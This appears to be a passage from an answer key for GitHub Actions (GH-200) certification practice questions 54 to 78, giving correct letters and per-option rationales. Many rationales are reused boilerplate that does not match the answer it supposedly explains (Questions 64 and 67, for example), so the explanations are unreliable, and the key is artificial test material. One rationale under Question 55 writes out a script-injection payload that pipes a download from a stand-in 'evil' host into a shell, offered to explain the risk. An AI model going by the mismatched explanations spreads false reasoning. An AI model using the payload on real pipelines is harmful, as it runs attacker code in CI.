Correct answers: B, C, and F (are correct). Declare `name`, `description`, `inputs`, `outputs`, and `runs: { using: 'node20', main: 'dist/index.js' }` in `action.yml`; mask any dynamically acquired tokens via `core.setSecret()` BEFORE logging; and commit the bundled `dist/` output (`verifying git diff --exit-code dist/ in CI`). [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. Bundling dependencies into committed `dist/index.js` makes JavaScript actions self-contained and fast across Linux, Windows, and macOS.
- **C:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **F:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.

### Question 55 — `B` (Author and maintain actions)

Correct answer: B (is correct). `core.saveState('proxyPid', pid)` writes intra-action state to `$GITHUB_STATE` (`scoped strictly to pre/main/post of that single action step`), which `core.getState('proxyPid')` retrieves inside `main:` or `post:`. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.

### Question 56 — `B` (Author and maintain actions)

Correct answer: B (is correct). Under the hood, `core.exportVariable()` appends safely formatted entries to `$GITHUB_ENV` (`as well as setting process.env for the current action`), making `$EDI_ENDPOINT` available to all subsequent steps in the SAME job. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 57 — `A` (Author and maintain actions)

Correct answer: A (is correct). Create `aegisrail-sec/cosign-verify` with `Internal` repository visibility (`giving all Enterprise members read access to docs/code`) AND set `Settings -> Actions -> General -> Access -> Accessible from repositories in the enterprise` (`authorizing workflow execution via GITHUB_TOKEN`). [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 58 — `B` (Author and maintain actions)

Correct answer: B (is correct). Cross-repository subfolder references (`uses: org/repo/path@ref`) still require the target `Private`/`Internal` repository to enable `Actions -> General -> Access` sharing (`or be moved into a dedicated shared action repository`), whereas `uses: ./.github/actions/...` is local-only after `actions/checkout`. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 59 — `D` (Author and maintain actions)

Correct answer: D (is correct). Creating a `Public` single-action repo with root `action.yml`, adding unique `name`/`description`/`README`/`branding`, enabling `2FA` + accepting the Marketplace Developer Agreement, and drafting a `v1.0.0` Release (`Publish to Marketplace`) lists the action. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Incorrect. Private/Internal repos and multi-action monorepos cannot publish directly to GitHub Marketplace, and Releases + `2FA` are required.
- **B:** Incorrect. EMU accounts cannot publish public repos on `github.com`, and `description`/`runs` + SemVer version tags are mandatory.
- **C:** Incorrect. Marketplace enforces globally unique action `name` metadata and root `action.yml` validation inside the Release UI.
- **D:** Correct. GitHub Marketplace requires a public single-action repo with root `action.yml`, complete branding/docs, `2FA`, and a SemVer GitHub Release.

### Question 60 — `A` (Author and maintain actions)

Correct answer: A (is correct). No — GitHub Marketplace is strictly for `Public` single-action repositories (`the Publish to Marketplace checkbox does not exist on Private or Internal repositories`); share internal actions via `Internal` repos + `Access` policies and an internal catalog/starter workflow instead. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Correct. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — GitHub Marketplace is strictly for `Public` single-action repositories (`the Publish to Marketplace checkbox does not exist on Private or Internal repositories`); share internal actions via `Internal` repos + `Access` policies and an internal catalog/starter workflow instead.
- **D:** Incorrect. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.

### Question 61 — `D` (Author and maintain actions)

Correct answer: D (is correct). Publish tag `v2.0.0-rc.1` with `Set as a pre-release` checked on the GitHub Release (`and do NOT move floating major tag v1 or production v2 until v2.0.0 GA is verified`). [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.

### Question 62 — `B, E` (Author and maintain actions)

Correct answers: B and E (are correct). Format references with trailing SemVer comments (`uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2`), and enable Dependabot `github-actions` updates (`optionally grouped via groups:` in `dependabot.yml`) to propose verified SHA bumps automatically. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. Combining immutable SemVer releases, major `v1` convenience tags, and 40-char SHA pinning follows GitHub official action release guidance.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **E:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **F:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 63 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Organization Repository Rulesets (`POST/PUT /orgs/{org}/rulesets` targeting `~DEFAULT_BRANCH` with a `workflows` rule) enforce central required workflows declaratively across all matching repositories. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **B:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 64 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Keep `v1` tag/branch/SHA immutable (`or maintain parallel v1/v2 workflow files`) while publishing `v2` alongside Dependabot `github-actions` updates (`since Dependabot also updates uses: org/repo/.github/workflows/*.yml@v1 -> @v2`!). [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 65 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Careful: inside a `workflow_call` workflow, `actions/checkout` (with default repo) checks out the CALLER repo (`aegisrail/customs-gw`), NOT `aegisrail/ci-blueprints`! Reference the helper action via full repository coordinates `uses: aegisrail/ci-blueprints/.github/actions/setup-edi@<sha>` (`with Access sharing enabled`) so the runner fetches it cleanly. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 66 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). No — the `Access` sharing setting grants read/execute permission strictly for GitHub Actions to fetch actions and `workflow_call` workflows from `aegisrail/edi-schemas`; `GITHUB_TOKEN` can NEVER write across repositories. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **C:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 67 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). No — Enterprise and Organization retention limits act as an upper ceiling; repository admins (`and upload-artifact@v4 retention-days`) can configure SHORTER retention (`e.g., 7 or 30 days`), never longer than the Enterprise policy cap. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 68 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Yes — keeping a repository `Private` while setting `Actions -> General -> Access` to `enterprise` allows Actions workflows in sibling Enterprise orgs (`Private`/`Internal` repos) to execute its actions/reusable workflows at runtime without granting human Enterprise members browse access to the `Private` repo. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 69 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Local path actions (`uses: ./.github/actions/...`) execute from the already checked-out caller commit (`GITHUB_SHA`) and are EXEMPT from external `@<40-char-sha>` syntax (`whereas external org/repo@ref actions must use a full 40-char commit SHA`). [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 70 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). A contributor with `Read` + fork access (who lacks direct write access to protected `main` or production environments) could modify `.github/workflows/*.yml` in their private fork PR to print or exfiltrate repository secrets if secrets were injected into fork PR runs. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 71 — `D, E, F` (Manage GitHub Actions for the enterprise)

Correct answers: D, E, and F (are correct). Enforce `Allow select actions and reusable workflows` + `Require actions to be pinned to a full-length commit SHA`; share proprietary CI assets via `Internal`/`Private` repos with `Access -> enterprise`; and lock default `GITHUB_TOKEN` workflow permissions to read-only (`with PR approval by Actions disabled`). [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Correct. Enterprise reuse combines `Internal`/`Private` repo `Access` sharing with allowlist + 40-character SHA pinning policies.
- **E:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **F:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.

### Question 72 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). GitHub's supported GA Actions Runner Controller deploys two Helm charts from `oci://ghcr.io/actions/actions-runner-controller-charts`: cluster-wide `gha-runner-scale-set-controller` and per-pool `gha-runner-scale-set` (`outbound long-polling, zero inbound webhooks needed`). [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 73 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). In GA ARC, `gha-runner-scale-set-controller` automatically spawns a lightweight outbound HTTPS long-polling **listener pod** per scale set that connects outbound (`443`) to GitHub's Actions service to receive real-time queue demand and spin up ephemeral runner pods. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.

### Question 74 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Creating an org GitHub App + K8s Secret, scoping a Runner Group (`no Public repos`), deploying `gha-runner-scale-set-controller` + `gha-runner-scale-set` (`minRunners: 0`), and allowing egress to `github.com`, `*.actions.githubusercontent.com`, and `ghcr.io` establishes production ARC scaling. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. Legacy webhook ARC is deprecated; GA `gha-runner-scale-set` uses outbound long-polling and ephemeral single-job pods.
- **B:** Incorrect. Cloning `.runner` identity files triggers session conflicts; ARC mints fresh JIT runner configs per pod.
- **C:** Correct. GA ARC pairs `gha-runner-scale-set` + GitHub App auth inside a restricted Runner Group with Immutable Actions (`ghcr.io`) egress.
- **D:** Incorrect. Personal PATs share a 5,000/hr cap, public repos expose internal clusters to fork PR attacks, and blocking `ghcr.io` breaks Immutable Actions.

### Question 75 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Each active Linux or Windows Larger runner VM injected into your Azure VNet consumes a private IPv4 address (`NIC`) from the `GitHub.Network/networkSettings` delegated subnet for the duration of the job (`so an undersized /28 subnet stalls runner provisioning under peak concurrency`). [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!

### Question 76 — `A, D` (Manage GitHub Actions for the enterprise)

Correct answers: A and D (are correct). Even inside a private Azure VNet (`with NSGs / Azure Firewall`), runners MUST retain outbound HTTPS (`443`) connectivity to GitHub Actions control-plane/cache/artifact endpoints AND `ghcr.io` / `pkg.actions.githubusercontent.com` (`for Immutable Actions`), while Azure VNet Private DNS Zones resolve internal private endpoints cleanly. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **B:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. Linux/Windows Larger runners join Azure VNets via `NetworkSettings`, and egress allowlists must include `pkg.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 77 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). The `/meta` `.actions` IP list spans THOUSANDS of broad shared Azure cloud CIDRs used by EVERY GitHub customer's workflows worldwide (`so allowlisting them exposes your firewall to arbitrary external GitHub repositories`); use Azure Private Networking (`VNet`), Larger runner static IPs, OIDC + cloud relays, or self-hosted/ARC runners instead. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!

### Question 78 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Specifying `runs-on: { group: rail-eu-runners, labels: [linux, x64] }` explicitly pins routing to Runner Group `rail-eu-runners` (`preventing accidental scheduling onto another group that shares generic linux/x64 labels`). [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
